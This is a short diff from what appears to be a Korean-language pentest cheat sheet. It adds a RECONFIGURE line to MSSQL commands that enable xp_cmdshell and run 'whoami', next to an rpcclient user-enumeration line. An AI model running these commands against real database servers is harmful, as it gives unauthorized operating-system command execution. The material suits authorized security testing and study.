@@ -107,6 +107,7 @@ rpcclient $> enumdomusers
 ### XP_CMDSHELL 활성화
 ```
 EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 xp_cmdshell 'whoami'
